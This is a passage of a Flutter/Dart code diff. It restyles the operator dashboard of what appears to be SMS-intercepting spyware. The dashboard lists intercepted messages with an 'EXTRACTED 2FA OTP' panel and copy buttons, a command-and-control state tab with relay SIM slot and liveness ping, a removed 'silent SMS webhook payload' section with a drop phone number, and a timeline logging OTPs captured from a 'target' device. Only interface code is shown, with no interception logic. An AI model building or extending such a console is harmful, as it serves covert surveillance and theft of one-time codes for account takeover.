-                        style: const TextStyle(fontSize: 11, color: CupertinoColors.systemGrey),
-                      ),
-                    ],
-                  ),
-                  const SizedBox(height: 4),
-                  if (m['extractedOtp'] != null)
-                    Container(
-                      margin: const EdgeInsets.only(bottom: 4),
-                      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
-                      decoration: BoxDecoration(
-                        color: CupertinoColors.systemRed.withOpacity(0.2),
-                        border: Border.all(color: CupertinoColors.systemRed, width: 0.5),
-                        borderRadius: BorderRadius.circular(4),
-                      ),
-                      child: Text(
-                        'OTP: ${m['extractedOtp']}',
-                        style: const TextStyle(
-                          fontFamily: 'monospace',
-                          fontWeight: FontWeight.bold,
-                          color: CupertinoColors.systemOrange,
-                          fontSize: 11,
-                        ),
-                      ),
-                    ),
-                  Text(
-                    m['message'] as String,
-                    maxLines: 2,
-                    overflow: TextOverflow.ellipsis,
-                    style: const TextStyle(fontSize: 13, color: CupertinoColors.systemGrey, height: 1.3),
-                  ),
-                ],
-              ),
+            Text(
+              _formatTime(m['time']),
+              style: const TextStyle(fontSize: 11, color: Colors.grey),
             ),
           ],
         ),
+        subtitle: Column(
+          crossAxisAlignment: CrossAxisAlignment.start,
+          children: [
+            const SizedBox(height: 4),
+            if (m['extractedOtp'] != null)
+              Container(
+                margin: const EdgeInsets.only(bottom: 4),
+                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
+                decoration: BoxDecoration(
+                  color: Colors.redAccent.withOpacity(0.2),
+                  borderRadius: BorderRadius.circular(4),
+                  border: Border.all(color: Colors.redAccent, width: 0.5),
+                ),
+                child: Text(
+                  'OTP: ${m['extractedOtp']}',
+                  style: const TextStyle(
+                    fontFamily: 'monospace',
+                    fontWeight: FontWeight.bold,
+                    color: Colors.amberAccent,
+                    fontSize: 11,
+                  ),
+                ),
+              ),
+            Text(
+              m['message'] as String,
+              maxLines: 2,
+              overflow: TextOverflow.ellipsis,
+              style: TextStyle(fontSize: 12, color: Colors.grey.shade300),
+            ),
+          ],
+        ),
+        trailing: const Icon(Icons.chevron_right, size: 18, color: Colors.grey),
       ),
     );
   }
 
-  void showMessageActionSheet(Map<String, dynamic> m) {
-    showCupertinoModalPopup(
+  void _showMessageBottomSheet(Map<String, dynamic> m) {
+    showModalBottomSheet(
       context: context,
-      builder: (ctx) => CupertinoActionSheet(
-        title: Text('${m['sender']} · ${m['time']}', style: const TextStyle(fontWeight: FontWeight.bold)),
-        message: Column(
+      isScrollControlled: true,
+      backgroundColor: const Color(0xFF18181C),
+      shape: const RoundedRectangleBorder(
+        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
+      ),
+      builder: (ctx) => Padding(
+        padding: const EdgeInsets.all(20),
+        child: Column(
+          mainAxisSize: MainAxisSize.min,
+          crossAxisAlignment: CrossAxisAlignment.start,
           children: [
-            const SizedBox(height: 8),
-            Text(m['message'], style: const TextStyle(fontSize: 13, color: CupertinoColors.white)),
+            Center(
+              child: Container(
+                width: 40,
+                height: 4,
+                decoration: BoxDecoration(color: Colors.grey.shade600, borderRadius: BorderRadius.circular(2)),
+              ),
+            ),
+            const SizedBox(height: 16),
+            Row(
+              mainAxisAlignment: MainAxisAlignment.spaceBetween,
+              children: [
+                Text(m['sender'], style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
+                Text(m['time'], style: const TextStyle(fontSize: 12, color: Colors.grey)),
+              ],
+            ),
+            const SizedBox(height: 16),
+            Container(
+              padding: const EdgeInsets.all(12),
+              decoration: BoxDecoration(
+                color: Colors.black26,
+                borderRadius: BorderRadius.circular(12),
+                border: Border.all(color: const Color(0xFF2A2A30)),
+              ),
+              child: SelectableText(
+                m['message'],
+                style: const TextStyle(fontSize: 13, height: 1.4),
+              ),
+            ),
             if (m['extractedOtp'] != null) ...[
               const SizedBox(height: 12),
               Container(
-                padding: const EdgeInsets.all(8),
+                padding: const EdgeInsets.all(12),
                 decoration: BoxDecoration(
-                  color: CupertinoColors.systemRed.withOpacity(0.15),
-                  border: Border.all(color: CupertinoColors.systemRed),
-                  borderRadius: BorderRadius.circular(8),
+                  color: Colors.redAccent.withOpacity(0.12),
+                  borderRadius: BorderRadius.circular(12),
+                  border: Border.all(color: Colors.redAccent),
                 ),
-                child: Text(
-                  'Extracted OTP: ${m['extractedOtp']}',
-                  style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold, fontSize: 16, color: CupertinoColors.systemOrange),
+                child: Row(
+                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                  children: [
+                    Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        const Text('EXTRACTED 2FA OTP', style: TextStyle(fontSize: 10, color: Colors.amberAccent, fontWeight: FontWeight.bold)),
+                        Text(m['extractedOtp'], style: const TextStyle(fontFamily: 'monospace', fontSize: 20, fontWeight: FontWeight.bold)),
+                      ],
+                    ),
+                    FilledButton.icon(
+                      icon: const Icon(Icons.copy, size: 16),
+                      label: const Text('Copy OTP'),
+                      onPressed: () {
+                        _copyToClipboard(m['extractedOtp'], 'OTP');
+                        Navigator.pop(ctx);
+                      },
+                    ),
+                  ],
                 ),
               ),
-            ]
+            ],
+            const SizedBox(height: 16),
+            Row(
+              children: [
+                Expanded(
+                  child: OutlinedButton.icon(
+                    icon: const Icon(Icons.copy, size: 16),
+                    label: const Text('Copy Full SMS'),
+                    onPressed: () {
+                      _copyToClipboard(m['message'], 'Message');
+                      Navigator.pop(ctx);
+                    },
+                  ),
+                ),
+                const SizedBox(width: 12),
+                Expanded(
+                  child: FilledButton(
+                    child: const Text('Done'),
+                    onPressed: () => Navigator.pop(ctx),
+                  ),
+                ),
+              ],
+            ),
           ],
         ),
-        actions: [
-          if (m['extractedOtp'] != null)
-            CupertinoActionSheetAction(
-              onPressed: () {
-                Clipboard.setData(ClipboardData(text: m['extractedOtp']));
-                Navigator.pop(ctx);
-              },
-              child: const Text('Copy OTP Code'),
+      ),
+    );
+  }
+
+  // ==================== COMMANDS TAB ====================
+  Widget _buildCommandsTab() {
+    return ListView(
+      padding: const EdgeInsets.all(16),
+      children: [
+        Card(
+          child: Padding(
+            padding: const EdgeInsets.all(16),
+            child: Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                const Text('REALTIME CONTROLLER STATE', style: TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
+                const SizedBox(height: 12),
+                ListTile(
+                  contentPadding: EdgeInsets.zero,
+                  title: const Text('Active Command'),
+                  subtitle: Text(_command, style: const TextStyle(fontFamily: 'monospace', color: Color(0xFF00ADB5), fontSize: 16)),
+                ),
+                ListTile(
+                  contentPadding: EdgeInsets.zero,
+                  title: const Text('Relay SIM Slot Index'),
+                  trailing: Text(_simSlot, style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold)),
+                ),
+              ],
             ),
-          CupertinoActionSheetAction(
-            onPressed: () {
-              Clipboard.setData(ClipboardData(text: m['message']));
-              Navigator.pop(ctx);
-            },
-            child: const Text('Copy Message Text'),
           ),
-        ],
-        cancelButton: CupertinoActionSheetAction(
-          onPressed: () => Navigator.pop(ctx),
-          child: const Text('Done'),
+        ),
+        const SizedBox(height: 12),
+        Card(
+          child: Padding(
+            padding: const EdgeInsets.all(16),
+            child: Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                const Text('LIVENESS PROTOCOL', style: TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
+                const SizedBox(height: 12),
+                ListTile(
+                  contentPadding: EdgeInsets.zero,
+                  title: const Text('Server Ping Probe'),
+                  trailing: Text(_ping, style: const TextStyle(fontFamily: 'monospace', color: Color(0xFF00ADB5))),
+                ),
+                ListTile(
+                  contentPadding: EdgeInsets.zero,
+                  title: const Text('Client Pong Response'),
+                  trailing: Text(_pong, style: const TextStyle(fontFamily: 'monospace', color: Colors.greenAccent, fontWeight: FontWeight.bold)),
+                ),
+                ListTile(
+                  contentPadding: EdgeInsets.zero,
+                  title: const Text('Status'),
+                  trailing: const Chip(
+                    label: Text('ACTIVE & LIVE', style: TextStyle(color: Colors.greenAccent, fontSize: 11, fontWeight: FontWeight.bold)),
+                    backgroundColor: Color(0x2200FF00),
+                  ),
+                ),
+              ],
+            ),
+          ),
+        ),
+      ],
+    );
+  }
+
+  // ==================== TIMELINE TAB ====================
+  Widget _buildTimelineTab() {
+    return ListView(
+      padding: const EdgeInsets.all(16),
+      children: [
+        _buildTimelineItem('2026-11-19 16:58', 'NEW_SMS_INTERCEPTED', 'Sony LIV OTP (2395) captured on device 03e768e104ef026d.', Colors.greenAccent),
+        _buildTimelineItem('2026-11-19 16:52', 'BATTERY_LEVEL_CHANGED', 'Battery shifted from 74% to 71%.', Colors.amberAccent),
+        _buildTimelineItem('2026-11-19 16:49', 'INITIAL_TRACKER_RUN', 'Surveillance tracker initialized for target 03e768e104ef026d.', const Color(0xFF00ADB5)),
+      ],
+    );
+  }
+
+  Widget _buildTimelineItem(String time, String type, String desc, Color color) {
+    return Card(
+      margin: const EdgeInsets.only(bottom: 8),
+      child: Padding(
+        padding: const EdgeInsets.all(16),
+        child: Column(
+          crossAxisAlignment: CrossAxisAlignment.start,
+          children: [
+            Row(
+              mainAxisAlignment: MainAxisAlignment.spaceBetween,
+              children: [
+                Chip(
+                  label: Text(type, style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: color)),
+                  backgroundColor: color.withOpacity(0.12),
+                  padding: EdgeInsets.zero,
+                  materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
+                ),
+                Text(time, style: const TextStyle(fontSize: 11, color: Colors.grey)),
+              ],
+            ),
+            const SizedBox(height: 8),
+            Text(desc, style: const TextStyle(fontSize: 13)),
+          ],
         ),
       ),
     );
   }
 
-  Widget buildCommandsTab() {
-    return SafeArea(
-      child: ListView(
-        padding: const EdgeInsets.symmetric(vertical: 16),
-        children: [
-          CupertinoListSection.insetGrouped(
-            header: const Text('REALTIME C2 CONTROLLER STATE'),
-            backgroundColor: CupertinoColors.black,
-            children: [
-              CupertinoListTile(
-                title: const Text('Active Command'),
-                subtitle: Text(command, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemCyan)),
-              ),
-              CupertinoListTile(
-                title: const Text('Relay SIM Slot'),
-                trailing: Text(simSlot, style: const TextStyle(fontFamily: 'monospace')),
-              ),
-            ],
-          ),
-          CupertinoListSection.insetGrouped(
-            header: const Text('LIVENESS HANDSHAKE'),
-            backgroundColor: CupertinoColors.black,
-            children: [
-              CupertinoListTile(
-                title: const Text('Server Ping'),
-                trailing: Text(ping, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemCyan)),
-              ),
-              CupertinoListTile(
-                title: const Text('Client Pong'),
-                trailing: Text(pong, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.activeGreen)),
-              ),
-              const CupertinoListTile(
-                title: Text('Handshake Status'),
-                trailing: Text('Active & Live', style: TextStyle(color: CupertinoColors.activeGreen, fontWeight: FontWeight.bold)),
-              ),
-            ],
-          ),
-          CupertinoListSection.insetGrouped(
-            header: const Text('SILENT SMS WEBHOOK PAYLOAD'),
-            backgroundColor: CupertinoColors.black,
-            children: [
-              CupertinoListTile(
-                title: const Text('Destination Drop'),
-                trailing: Text(dropPhone, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemOrange)),
-              ),
-              CupertinoListTile(
-                title: const Text('Silent Payload'),
-                subtitle: Text(silentSms, style: const TextStyle(fontFamily: 'monospace', fontSize: 11)),
-              ),
-            ],
-          ),
-        ],
-      ),
-    );
-  }
-
-  Widget buildTimelineTab() {
-    return SafeArea(
-      child: ListView(
-        padding: const EdgeInsets.all(16),
-        children: [
-          _buildTimelineCard('2026-11-19 16:58', 'NEW_SMS_INTERCEPTED', 'Sony LIV OTP (2395) intercepted on device.'),
-          _buildTimelineCard('2026-11-19 16:52', 'BATTERY_LEVEL_CHANGED', 'Battery level shifted from 74% to 71%.'),
-          _buildTimelineCard('2026-11-19 16:49', 'INITIAL_TRACKER_RUN', 'Initialized automated surveillance tracking for 03e768e104ef026d.'),
-        ],
-      ),
-    );
-  }
-
-  Widget _buildTimelineCard(String time, String type, String desc) {
-    return Container(
-      margin: const EdgeInsets.only(bottom: 12),
-      padding: const EdgeInsets.all(12),
-      decoration: BoxDecoration(
-        color: const Color(0xFF1C1C1E),
-        borderRadius: BorderRadius.circular(10),
-        border: Border.all(color: const Color(0x33545458), width: 0.5),
-      ),
-      child: Column(
-        crossAxisAlignment: CrossAxisAlignment.start,
-        children: [
-          Row(
-            mainAxisAlignment: MainAxisAlignment.spaceBetween,
-            children: [
-              Text(type, style: const TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: CupertinoColors.activeBlue)),
-              Text(time, style: const TextStyle(fontSize: 11, color: CupertinoColors.systemGrey)),
-            ],
-          ),
-          const SizedBox(height: 6),
-          Text(desc, style: const TextStyle(fontSize: 13, color: CupertinoColors.white)),
-        ],
-      ),
-    );
-  }
-
-  String formatTime(String timeStr) {
+  String _formatTime(String timeStr) {
     if (timeStr.contains('|')) {
       return timeStr.split('|')[1].trim().toUpperCase();
     }
